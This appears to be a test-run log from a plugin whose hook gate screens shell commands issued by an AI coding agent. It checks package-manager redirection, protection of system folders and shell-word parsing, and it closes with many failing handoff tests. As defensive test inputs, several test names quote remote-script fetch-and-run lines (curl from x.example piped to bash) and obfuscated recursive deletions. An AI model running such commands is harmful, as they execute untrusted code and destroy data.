+(pass) bun.lock denies pnpx cowsay hi naming bunx [0.17ms]
+(pass) bun.lock denies sudo npm install naming bun install [0.21ms]
+(pass) bun.lock denies sh -c 'npm install' naming bun install [0.25ms]
+(pass) bun.lock denies deno task dev naming bun run [0.17ms]
+(pass) bun.lock denies npm ci naming bun install --frozen-lockfile [0.17ms]
+(pass) bun.lock denies npm update naming bun update [0.16ms]
+(pass) bun.lock denies pnpm view left-pad naming bun info [0.17ms]
+(pass) bun.lock denies deno add zod naming bun add [0.17ms]
+(pass) bun.lock denies deno x npm:cowsay naming bunx [0.17ms]
+(pass) deno.json lets deno through under bun.lock [0.16ms]
+(pass) bun.lock passes echo npm install [0.16ms]
+(pass) bun.lock passes grep npm package.json [0.14ms]
+(pass) bun.lock passes git commit -m 'npm install' [0.17ms]
+(pass) bun.lock passes git log --grep=yarn [0.17ms]
+(pass) bun.lock passes bun install [0.14ms]
+(pass) bun.lock passes deno test [0.14ms]
+(pass) no lock file, no package rule [0.15ms]
+(pass) xmake.lua denies cmake --build build naming xmake build [0.20ms]
+(pass) xmake.lua denies make clean naming xmake build [0.17ms]
+(pass) xmake.lua denies ninja naming xmake build [0.16ms]
+(pass) xmake.lua denies conan install . naming xmake require [0.17ms]
+(pass) xmake.lua denies cmake -S . -B build naming xmake config [0.19ms]
+(pass) xmake.lua denies ninja -t clean naming xmake clean [0.16ms]
+(pass) xmake.lua denies make install naming xmake install [0.16ms]
+(pass) a CMakeLists.txt lets cmake --build build through under xmake.lua [0.16ms]
+(pass) a build.ninja lets ninja through under xmake.lua [0.13ms]
+(pass) a Makefile lets make through under xmake.lua [0.15ms]
+(pass) a conanfile.txt lets conan install . through under xmake.lua [0.13ms]
+(pass) xmake.lua passes echo cmake --build build [0.14ms]
+(pass) xmake.lua passes grep make Makefile [0.13ms]
+(pass) xmake.lua passes git commit -m 'make clean' [0.14ms]
+(pass) xmake.lua passes git log --grep=ninja [0.14ms]
+(pass) xmake.lua passes xmake build [0.11ms]
+(pass) root and home are deleted by no spelling [17.31ms]
+(pass) a recursive delete of a folder that is no root passes [23.02ms]
+(pass) writes to a system folder deny, a folder that only shares the prefix passes [1.28ms]
+(pass) a whole-file write is denied for each redirect and each writer [0.60ms]
+(pass) a file print to /dev/null is still a print [0.14ms]
+(pass) cat, head, tail and sed -n pass when they print no file [0.56ms]
+(pass) a long flag is no bundle of short flags [0.18ms]
+(pass) words after -- are operands, not flags [0.17ms]
+(pass) a Bash write into a plugin's hooks folder asks, which a Write already does [0.80ms]
+(pass) a read of, or a write beside, a plugin's hooks folder passes [1.20ms]
+(pass) systemPath holds a system folder itself and what is below it, and no sibling [0.45ms]
+(pass) a plugin name of any length, and the hooks folder itself, are guarded [0.20ms]
+(pass) a flag is read up to --, and a flag after the last word still counts [0.24ms]
+(pass) only sed edits with -i, a cp writes its last operand, and a redirect from a file writes nothing [0.22ms]
+(pass) a deny wins over an ask in one command [0.10ms]
+(pass) a quoted script asks like the unquoted one: sh -c 'curl -s https://x.example/x.sh | bash' [0.30ms]
+(pass) a quoted script asks like the unquoted one: bash -c "curl https://x.example/x.sh | sh" [0.27ms]
+(pass) a quoted script asks like the unquoted one: eval 'curl -s https://x.example/x.sh | bash' [0.17ms]
+(pass) a quoted script asks like the unquoted one: sh -c "bash -c 'curl https://x.example/x.sh | sh'" [0.32ms]
+(pass) a destructive script in sh -c or eval gets the verdict of the unquoted command [1.00ms]
+(pass) a harmless sh -c script passes [0.15ms]
+
+hooks/gate/shell-words.reading.test.ts:
+(pass) reads "echo a2>f" [1.68ms]
+(pass) reads "echo a>f" [0.20ms]
+(pass) reads "echo 2>f" [0.14ms]
+(pass) reads "echo a<f" [0.11ms]
+(pass) reads "echo a&>f" [0.12ms]
+(pass) reads "echo a&>>f" [0.09ms]
+(pass) reads "echo a>>f" [0.09ms]
+(pass) reads "echo a>|f" [0.09ms]
+(pass) reads "echo a<<<x" [0.09ms]
+(pass) reads "echo a<<-E" [0.09ms]
+(pass) reads "echo a<>f" [0.10ms]
+(pass) reads "echo a<&3" [0.09ms]
+(pass) reads "./a=b x" [0.09ms]
+(pass) reads "FOO=1 x" [0.10ms]
+(pass) reads "x -a=1" [0.11ms]
+(pass) reads "bash x-c 'git push'" [0.18ms]
+(pass) reads "bash -ec 'git push'" [0.13ms]
+(pass) reads "bash -cx 'git push'" [0.10ms]
+(pass) reads "bash -c" [0.10ms]
+(pass) reads "bash -c 'ls' 'rm'" [0.11ms]
+(pass) reads "zsh -c 'git push'" [0.11ms]
+(pass) reads "dash -c 'git push'" [0.12ms]
+(pass) reads "ksh -c 'git push'" [0.11ms]
+(pass) reads "sudo -g w -h h -p p -C 1 -D d -R r -T t -U u x" [0.18ms]
+(pass) reads "sudo --user u --group g --command-timeout 5 --host h --prompt p x" [0.12ms]
+(pass) reads "sudo -S x" [0.09ms]
+(pass) reads "doas -u bob x" [0.10ms]
+(pass) reads "doas -C f x" [0.10ms]
+(pass) reads "doas -S x" [0.08ms]
+(pass) reads "env -u A x" [0.10ms]
+(pass) reads "env -C d x" [0.08ms]
+(pass) reads "env -S s x" [0.08ms]
+(pass) reads "env -g x" [0.13ms]
+(pass) reads "nice -n 5 x" [0.12ms]
+(pass) reads "nice -a 5 x" [0.11ms]
+(pass) reads "exec -a n x" [0.10ms]
+(pass) reads "exec -n x" [0.09ms]
+(pass) reads "timeout -s 9 5 x" [0.10ms]
+(pass) reads "timeout -k 1 5 x" [0.09ms]
+(pass) reads "timeout -n 5 x" [0.10ms]
+(pass) reads "nohup -x y" [0.09ms]
+(pass) reads "time -p x" [0.09ms]
+(pass) reads "command -v x" [0.09ms]
+(pass) reads "builtin x" [0.09ms]
+(pass) reads "env" [0.09ms]
+(pass) reads "env -i" [0.09ms]
+(pass) reads "sudo" [0.09ms]
+(pass) reads "x=1" [0.10ms]
+(pass) reads "if x; then y; fi" [0.14ms]
+(pass) reads "while a; do b; done" [0.10ms]
+(pass) reads "until a; do b; done" [0.10ms]
+(pass) reads "{ a; }" [0.11ms]
+(pass) reads "! a" [0.15ms]
+(pass) reads "else a" [0.10ms]
+(pass) reads "elif a" [0.10ms]
+(pass) reads "do a" [0.08ms]
+(pass) reads "a \"$(b)\"" [0.18ms]
+(pass) reads "a $(b \"c)\" d)" [0.10ms]
+(pass) reads "a $(b 'c)' d)" [0.09ms]
+(pass) reads "a $(b \"\\\"\" ) c)" [0.09ms]
+(pass) reads "a $(b \\)  c)" [0.10ms]
+(pass) reads "a $((1+2))" [0.09ms]
+(pass) reads "a $( (b) )" [0.08ms]
+(pass) reads "a $(b" [0.09ms]
+(pass) reads "a `b" [0.09ms]
+(pass) reads "a `b` c" [0.09ms]
+(pass) reads "a $'x\\ty'" [0.10ms]
+(pass) reads "a $'x\\\\ty'" [0.08ms]
+(pass) reads "a $'x" [0.08ms]
+(pass) reads "a $x" [0.08ms]
+(pass) reads "a \"$x\"" [0.08ms]
+(pass) reads "a \"x$y\"" [0.08ms]
+(pass) reads "a \"x$(b)y\"" [0.08ms]
+(pass) reads "a \"x`b`y\"" [0.08ms]
+(pass) reads "a \"\\$x\"" [0.08ms]
+(pass) reads "a \"\\`x\"" [0.08ms]
+(pass) reads "a \"\\\\x\"" [0.08ms]
+(pass) reads "a \"\\\"x\"" [0.08ms]
+(pass) reads "a \"\\nx\"" [0.08ms]
+(pass) reads "a \"x" [0.08ms]
+(pass) reads "a 'x" [0.08ms]
+(pass) reads "a \"x\\\"" [0.08ms]
+(pass) reads "a >(b)" [0.08ms]
+(pass) reads "a <(b)" [0.08ms]
+(pass) reads "a >(b" [0.08ms]
+(pass) reads "a 3>f" [0.09ms]
+(pass) reads "a 3>&1" [0.08ms]
+(pass) reads "a >f 2>&1" [0.08ms]
+(pass) reads "a &>(b)" [0.08ms]
+(pass) reads "a 'x'y" [0.08ms]
+(pass) reads "a x'y'" [0.09ms]
+(pass) reads "a ~" [0.08ms]
+(pass) reads "a x~" [0.08ms]
+(pass) reads "a ~x" [0.08ms]
+(pass) reads "a *.c" [0.08ms]
+(pass) reads "a x*" [0.08ms]
+(pass) reads "a ?" [0.08ms]
+(pass) reads "a [x]" [0.11ms]
+(pass) reads "a {x,y}" [0.08ms]
+(pass) reads "a x{y" [0.08ms]
+(pass) reads "a # c" [0.08ms]
+(pass) reads "a#b" [0.09ms]
+(pass) reads "a #c" [0.09ms]
+(pass) reads "a x # c" [0.08ms]
+(pass) reads "a x #c" [0.12ms]
+(pass) reads "a \\\nb" [0.08ms]
+(pass) reads "a \\a" [0.06ms]
+(pass) reads "a \\\\" [0.07ms]
+(pass) reads "a \\" [0.06ms]
+(pass) reads "a | b" [0.07ms]
+(pass) reads "a |& b" [0.06ms]
+(pass) reads "a || b" [0.06ms]
+(pass) reads "a && b" [0.07ms]
+(pass) reads "a & b" [0.06ms]
+(pass) reads "a &" [0.06ms]
+(pass) reads "a ; b" [0.06ms]
+(pass) reads "a;b" [0.06ms]
+(pass) reads "a\nb" [0.12ms]
+(pass) reads "a (b)" [0.07ms]
+(pass) reads "a )" [0.07ms]
+(pass) reads "cat <<A <<B\nx\nA\ny\nB\nz" [0.09ms]
+(pass) reads "cat <<A\nx\nA" [0.07ms]
+(pass) reads "cat <<A\n  A\ny" [0.08ms]
+(pass) reads "cat <<A\nx" [0.06ms]
+(pass) reads "cat <<-A\n\tA\ny" [0.07ms]
+(pass) reads "cat <<A; ls\nx\nA" [0.06ms]
+(pass) reads "bash <<A\nx\nA" [0.09ms]
+(pass) reads "sh <<<'x'" [0.07ms]
+(pass) reads "sh -c <<A\nx\nA" [0.09ms]
+(pass) reads "sh -c 'sh -c \"sh -c \\\"sh -c x\\\"\"'" [0.10ms]
+(pass) reads "a;b | c" [0.06ms]
+(pass) reads "echo \"a\nb\"" [0.05ms]
+(pass) reads "a<b>c" [0.05ms]
+(pass) reads "a $(b 'c' \"d\")" [0.07ms]
+(pass) reads "a $(b $(c))" [0.07ms]
+(pass) reads "echo $(a)x" [0.07ms]
+(pass) reads "a;" [0.06ms]
+(pass) reads "a ||" [0.06ms]
+(pass) reads "a\n\n\nb" [0.06ms]
+(pass) reads "a b\tc" [0.06ms]
+(pass) reads "a \t b" [0.06ms]
+(pass) reads "`a`" [0.06ms]
+(pass) reads "$(a)" [0.06ms]
+(pass) reads "a \"\"" [0.06ms]
+(pass) reads "a ''" [0.07ms]
+(pass) reads "a ''b" [0.05ms]
+(pass) reads "a \"x\"'y'z" [0.06ms]
+(pass) reads "sh -c 'sh -c \"sh -c \\\"sh -c \\\\\\\"sh -c x\\\\\\\"\\\"\"'" [0.09ms]
+(pass) reads "a $'x\\'y' z" [0.06ms]
+(pass) reads "a $'x\\" [1.33ms]
+(pass) reads "a $'\\'" [0.11ms]
+(pass) reads "a \"$(b \"c\")\"" [0.08ms]
+(pass) reads "a \"$(b)\" c" [0.07ms]
+(pass) reads "a \"`b`\" c" [0.06ms]
+(pass) reads "a \"x\\" [0.06ms]
+(pass) reads "a \"x\\\\\"" [0.06ms]
+(pass) reads "a \"$\"" [0.06ms]
+(pass) reads "a \"\\\\\" b" [0.06ms]
+(pass) reads "a \"$ b\" c" [0.06ms]
+(pass) reads "a $ b" [0.05ms]
+(pass) reads "a $(b) $(c)" [0.06ms]
+(pass) reads "a $(b \\\\) c)" [0.06ms]
+(pass) reads "a $(\"b)\")" [0.06ms]
+(pass) reads "a $('b)')" [0.06ms]
+(pass) reads "a $(b 'c\\' d)" [0.07ms]
+(pass) reads "a $(b \"c\\\" d)\" e)" [0.06ms]
+(pass) reads "a $(\"\")" [0.06ms]
+(pass) reads "a $( )" [0.06ms]
+(pass) reads "a $()" [0.06ms]
+(pass) reads "a >(b) >(c)" [0.06ms]
+(pass) reads "a '\\'b" [0.07ms]
+(pass) reads "a '\\' b" [0.06ms]
+(pass) reads "a \"'\" b" [0.05ms]
+(pass) reads "a '\"' b" [0.05ms]
+(pass) reads "a \"'\"c\"'\"" [0.05ms]
+(pass) reads "a `b` `c`" [0.06ms]
+(pass) reads "a \"`b`\"" [0.07ms]
+(pass) reads "a `b $(c)`" [0.08ms]
+(pass) reads "a $(b `c`)" [0.05ms]
+(pass) reads "a\\\nb" [0.05ms]
+(pass) reads "a b\\\n c" [0.05ms]
+(pass) reads "a ~ b" [0.05ms]
+(pass) reads "a b ~" [0.05ms]
+(pass) reads "a b~c d" [0.06ms]
+(pass) reads "a *" [0.05ms]
+(pass) reads "a \\*" [0.05ms]
+(pass) reads "a '*'" [0.05ms]
+(pass) reads "a \"*\"" [0.05ms]
+(pass) reads "a \\{" [0.05ms]
+(pass) reads "a '{'" [0.05ms]
+(pass) reads "a \\?" [0.06ms]
+(pass) reads "a \\~" [0.06ms]
+(pass) reads "a # b\nc" [0.05ms]
+(pass) reads "a #b\nc" [0.05ms]
+(pass) reads "a \\#b" [0.05ms]
+(pass) reads "a'#'b" [0.05ms]
+(pass) reads "a #" [0.05ms]
+(pass) reads "#a" [0.05ms]
+(pass) reads "# a\nb" [0.05ms]
+(pass) reads "a 'x'#y" [0.05ms]
+(pass) reads "a $x#y" [0.05ms]
+(pass) reads "a 2>f b" [0.06ms]
+(pass) reads "a 12>f" [0.06ms]
+(pass) reads "a x2>f" [0.05ms]
+(pass) reads "a 2 >f" [0.05ms]
+(pass) reads "a 2 3>f" [0.05ms]
+(pass) reads "a >" [0.04ms]
+(pass) reads "a >>" [0.05ms]
+(pass) reads "a <<" [0.05ms]
+(pass) reads "a <<-" [0.06ms]
+(pass) reads "a <<< " [0.06ms]
+(pass) reads "a >&" [0.05ms]
+(pass) reads "a >&-" [0.05ms]
+(pass) reads "a <&-" [0.05ms]
+(pass) reads "a & & b" [0.05ms]
+(pass) reads "a &&& b" [0.05ms]
+(pass) reads "a ||| b" [0.06ms]
+(pass) reads "a |||b" [0.06ms]
+(pass) reads "a |&b" [0.05ms]
+(pass) reads "a |\n b" [0.05ms]
+(pass) reads "a &\nb" [0.05ms]
+(pass) reads "a ;;b" [0.05ms]
+(pass) reads "a & b | c" [0.05ms]
+(pass) reads "cat <<A\nx\nA\nrm y" [0.08ms]
+(pass) reads "cat <<A\nx\nB\nA\nrm y" [0.06ms]
+(pass) reads "cat <<A\nx\r\nA\nrm y" [0.05ms]
+(pass) reads "cat <<A\n\nA\nrm y" [0.06ms]
+(pass) reads "cat <<A\nxA\nA\nrm y" [0.06ms]
+(pass) reads "cat <<A\nA \nrm y" [0.05ms]
+(pass) reads "cat <<A\nA" [0.06ms]
+(pass) reads "cat <<A\n" [0.05ms]
+(pass) reads "cat <<A\nrm x" [0.05ms]
+(pass) reads "cat <<A <<B\nx\nA\ny\nB\nrm z" [0.05ms]
+(pass) reads "cat <<A | rm x\ny\nA" [0.05ms]
+(pass) reads "cat <<<A\nrm x" [0.05ms]
+(pass) reads "cat <<-A\nx\nA\nrm y" [0.06ms]
+(pass) reads "a <<A\nrm\nA\n<<B\n" [0.06ms]
+(pass) reads "sh -c ''" [0.11ms]
+(pass) reads "sh -c 'x' 'y'" [0.06ms]
+(pass) reads "sh -c x" [0.05ms]
+(pass) reads "bash -c 'a;b'" [0.05ms]
+(pass) reads "sh -c \"x\" ; y" [0.05ms]
+(pass) reads "sudo bash -c 'git push'" [0.07ms]
+(pass) reads "env sh -c x" [0.07ms]
+(pass) reads "sh -xc x" [0.06ms]
+(pass) reads "sh -Cc x" [0.06ms]
+(pass) reads "sh -c -c x" [0.06ms]
+(pass) reads "sh x -c y" [0.12ms]
+(pass) reads "sh -c x -c y" [0.05ms]
+(pass) reads "sh <<A\nx\nA\nrm y" [0.05ms]
+(pass) reads "sh <<<x" [0.05ms]
+(pass) reads "sh <x" [0.05ms]
+(pass) reads "sh -c x <<A\nx\nA" [0.06ms]
+(pass) reads "sh -c x <<<y" [0.06ms]
+(pass) reads "sh -c x <y" [0.06ms]
+(pass) reads "eval x" [0.05ms]
+(pass) reads "eval" [0.05ms]
+(pass) reads "echo eval" [0.05ms]
+(pass) reads "x eval" [0.06ms]
+(pass) reads "FOO=1 eval x" [0.05ms]
+(pass) reads "sudo eval x" [0.05ms]
+(pass) reads "$x" [0.04ms]
+(pass) reads "$x y" [0.05ms]
+(pass) reads "\"$x\" y" [0.05ms]
+(pass) reads "x$y z" [0.05ms]
+(pass) reads "~/x" [0.05ms]
+(pass) reads "~x/y z" [0.04ms]
+(pass) reads "x/~ y" [0.05ms]
+(pass) reads "{x} y" [0.05ms]
+(pass) reads "x{y} z" [0.06ms]
+(pass) reads "a? b" [0.06ms]
+(pass) reads "[a] b" [0.05ms]
+(pass) reads "*.sh" [0.05ms]
+(pass) reads "a \\\"" [0.05ms]
+(pass) reads "\\a b" [0.06ms]
+(pass) reads "\\\na" [0.06ms]
+(pass) reads "\\\n\\\na" [0.05ms]
+(pass) reads "echo \"$(rm x)\"" [0.06ms]
+(pass) reads "echo \"`rm x`\"" [0.05ms]
+(pass) reads "echo '$(rm x)'" [0.05ms]
+(pass) reads "echo \\$(rm x)" [0.05ms]
+(pass) reads "echo \\`rm x\\`" [0.05ms]
+(pass) reads "echo \"\\$(rm x)\"" [0.05ms]
+(pass) reads "a\t\tb" [0.04ms]
+(pass) reads "\ta" [0.04ms]
+(pass) reads "a\t" [0.04ms]
+(pass) reads "  a  " [0.06ms]
+(pass) reads "\na" [0.24ms]
+(pass) reads "a\n" [0.08ms]
+(pass) reads "\n\na\n\n" [0.06ms]
+(pass) reads "x=1 y=2 z" [0.06ms]
+(pass) reads "a=b c=d" [0.07ms]
+(pass) reads "1a=b x" [0.07ms]
+(pass) reads "_a=b x" [0.05ms]
+(pass) reads "a-b=c x" [0.05ms]
+(pass) reads "=b x" [0.05ms]
+(pass) reads "a= x" [0.05ms]
+(pass) reads "! ! a" [0.06ms]
+(pass) reads "{ { a; }; }" [0.07ms]
+(pass) reads "if if a" [0.05ms]
+(pass) reads "then a" [0.06ms]
+(pass) reads "fi a" [0.05ms]
+(pass) reads "do do a" [0.05ms]
+(pass) reads "while until a" [0.05ms]
+(pass) reads "time time a" [0.06ms]
+(pass) reads "time nohup a" [0.06ms]
+(pass) reads "command command a" [0.07ms]
+(pass) reads "command -p a" [0.06ms]
+(pass) reads "builtin command a" [0.06ms]
+(pass) reads "nohup nohup a" [0.05ms]
+(pass) reads "sudo sudo a" [55.77ms]
+(pass) reads "sudo env a" [0.09ms]
+(pass) reads "env sudo a" [0.06ms]
+(pass) reads "env A=1 B=2 a" [0.06ms]
+(pass) reads "env -i A=1 a" [0.05ms]
+(pass) reads "env -u X -i a" [0.06ms]
+(pass) reads "env -- a" [0.05ms]
+(pass) reads "sudo -- a" [0.05ms]
+(pass) reads "sudo -u" [0.05ms]
+(pass) reads "sudo -u x" [0.05ms]
+(pass) reads "env -u" [0.05ms]
+(pass) reads "timeout 5" [0.06ms]
+(pass) reads "timeout" [0.05ms]
+(pass) reads "timeout 5 6" [0.05ms]
+(pass) reads "timeout -s" [0.05ms]
+(pass) reads "timeout -s 9" [0.06ms]
+(pass) reads "timeout -s 9 5" [0.05ms]
+(pass) reads "timeout 5 a" [0.06ms]
+(pass) reads "nice -n" [0.05ms]
+(pass) reads "nice -n 5" [0.06ms]
+(pass) reads "nice a" [0.05ms]
+(pass) reads "exec" [0.05ms]
+(pass) reads "exec a" [0.06ms]
+(pass) reads "exec -a" [0.05ms]
+(pass) reads "exec -a x" [0.05ms]
+(pass) reads "exec -a x y" [0.05ms]
+(pass) reads "echo 2a>f" [0.06ms]
+(pass) reads "echo 12>f" [0.05ms]
+(pass) reads "a &&>(b)" [0.07ms]
+(pass) reads "a &&>(;" [0.05ms]
+(pass) reads "<&bashb&#=" [0.07ms]
+(pass) reads "<&b&#=" [0.05ms]
+(pass) reads "a <&b&c" [0.05ms]
+(pass) reads "a&&b" [0.05ms]
+(pass) reads "a||b" [0.06ms]
+(pass) reads "a&b" [0.04ms]
+(pass) reads "a;;b" [0.04ms]
+(pass) reads "a & & b" [0.04ms]
+(pass) reads "{$'2\\>(-c\\-" [0.04ms]
+(pass) reads "echo $(echo \"abc" [0.04ms]
+(pass) reads "echo $(echo 'abc" [0.05ms]
+(pass) reads "bash <<< 'rm x'" [0.05ms]
+(pass) reads "sh <<-EOF\nrm x\nEOF" [0.05ms]
+(pass) reads "bash <<EOF\nrm x\nEOF" [0.04ms]
+(pass) reads "bash -c 'rm x' <<< y" [0.05ms]
+(pass) reads "nohup A=1 rm x" [0.05ms]
+(pass) reads "nohup -x rm x" [0.04ms]
+(pass) reads "time -p rm x" [0.04ms]
+(pass) reads "time A=1 rm x" [0.04ms]
+(pass) reads "command -v ls" [0.04ms]
+(pass) reads "command A=1 ls" [0.04ms]
+(pass) reads "builtin -x echo" [0.05ms]
+(pass) reads "cat <(x)" [0.04ms]
+(pass) reads "cat >(x)" [0.04ms]
+(pass) reads "echo `a" [0.04ms]
+(pass) reads "echo $'a\\'b'" [0.04ms]
+(pass) reads "echo $'a" [0.04ms]
+(pass) reads "echo \"a" [0.05ms]
+(pass) reads "a <<EOF\nx\nEOF\nb" [0.04ms]
+
+hooks/gate/shell-words.test.ts:
+(pass) a pipeline, a list, and a subshell give one command each [1.83ms]
+(pass) quotes join into one word and hide operators [0.29ms]
+(pass) a command in $(...) or backticks is a command of its own [0.26ms]
+(pass) a bash -c body is read as commands [0.29ms]
+(pass) a body nested past the depth bound is unreadable [0.30ms]
+(pass) wrappers do not hide the program: sudo -u bob git push [0.20ms]
+(pass) wrappers do not hide the program: sudo --chroot /x git push [0.17ms]
+(pass) wrappers do not hide the program: sudo --other-user bob --close-from 5 git push [0.14ms]
+(pass) wrappers do not hide the program: env -i A=1 git push [0.14ms]
+(pass) wrappers do not hide the program: FOO=1 nohup timeout 5 git push [0.14ms]
+(pass) wrappers do not hide the program: /usr/bin/git push [0.11ms]
+(pass) a redirect keeps its operator and target and is not a word [0.33ms]
+(pass) a heredoc body is skipped, and its command is read [0.16ms]
+(pass) a pipe marks both ends [0.12ms]
+(pass) the program or text cannot be read: $HOME/bin/git push [0.10ms]
+(pass) the program or text cannot be read: git$IFS push [0.09ms]
+(pass) the program or text cannot be read: $(echo git) push [0.10ms]
+(pass) the program or text cannot be read: eval 'git push' [0.09ms]
+(pass) the program or text cannot be read: echo 'unclosed [0.10ms]
+(pass) the program or text cannot be read: /b?n/rm -rf x [0.11ms]
+(pass) the program or text cannot be read: {rm,-rf,x} [0.10ms]
+(pass) the program or text cannot be read: bash <<EOF\u000als\u000aEOF [0.12ms]
+(pass) text in quotes or after echo is no command [0.18ms]
+
+hooks/gate/upstream.test.ts:
+(pass) the measured commands get the verdicts of the upstream rules plus the patch [14.10ms]
+(pass) every vendored positive fixture is caught, skipped by name, or covered by the unreadable ask [96.81ms]
+(pass) every vendored negative fixture is clean except the named ones [39.71ms]
+(pass) parsedTexts re-quotes a word with a quote, and dashes after -- become operands [0.25ms]
+(pass) parsedTexts reads a git command twice, the second without the options before its verb [0.14ms]
+
+hooks/handoff.test.ts:
+(fail) an instruction older than the last twelve turns stays in the handoff [203.30ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a session with no human statement writes no invented text under the two sections [83.79ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a key in a statement is redacted in the handoff [92.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a subagent's compaction writes no handoff [178.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a resume reads the newest fresh handoff back once [59.60ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a file newer than the one taken is taken in as well [151.14ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a resume of a session whose transcript is newer than the handoff injects nothing [92.96ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a key in a handoff file is redacted before the read-back injects it [120.65ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a handoff older than seven days is named in a log line and not injected [33.21ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) session.start registers the handoff tool [55.69ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a compaction leaves one handoff file named handoff- and a UTC stamp, under the root [116.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a /compact leaves one handoff file [51.35ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a precompute installs nothing, so it leaves no handoff file [93.96ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a session with no user turn leaves no file and no error [77.77ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a write that fails tells the user in one line [31.44ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the handoff names the files the session touched, and a call with no path adds none [124.87ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the handoff carries the user's ask [106.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a file Claude wrote is kept and no code-built one goes beside it [51.64ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a read of the handoff folder is not writing one, so the fallback still runs [136.67ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a misnamed handoff Claude wrote is copied to a valid name, and one line names both files [46.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a misnamed handoff that cannot be read leaves the code-built file, and one line names it and the cause [27.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the handoff block is the only one added, and the engine's context_management section is left out [19.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a project with no handoff folder yet takes nothing in and shows no error [154.66ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a session that starts fresh takes nothing in [89.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a handoff inside the stale limit is taken in, and its text opens with the source of the file [25.14ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a stale handoff is named once and not at every start [40.30ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a handoff file that cannot be read tells the user in one line [98.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a submit the session refuses tells the user in one line and does not fail the start [58.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(pass) the read-back line tells a code-built handoff from one Claude wrote [0.67ms]
+(fail) a typed clear, and a session that ends for another reason, leave no handoff file [27.43ms]
